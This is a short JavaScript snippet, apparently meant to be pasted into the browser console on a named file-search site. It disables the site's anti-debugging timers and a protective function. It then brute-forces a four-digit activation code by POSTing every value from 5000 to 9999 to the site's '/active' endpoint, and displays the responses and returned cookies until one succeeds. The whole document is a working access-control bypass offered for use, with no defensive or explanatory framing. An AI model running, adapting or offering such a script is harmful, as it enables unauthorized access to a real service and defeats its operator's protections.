//for https://www.alipansou.com/ 5678
_0x5299f0 = ()=>void 0;
for(let i = 0; i < 10000; i++){ clearInterval(i);}
let code = 5000;
let array = [];
const func = async ()=>{
    code++;
    let codeStr = "0000" + code;
    codeStr = codeStr.substring(codeStr.length - 4);
    const result = await fetch("/active",{
        method:"POST",
        headers:{
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body:'code='+codeStr
    });
    const sc = result.headers.getSetCookie();
    const resultStr = await result.text(); 
    array.push(codeStr + " - " + resultStr + ' - ' + JSON.stringify(sc));
    if(array.length > 50){
        array.splice(0,1);
    }
    document.body.innerHTML = array.join('<br/>');
    
    if(resultStr.trim() == '0' && code < 10000)
    {
        requestAnimationFrame(func);
    }
}
requestAnimationFrame(func);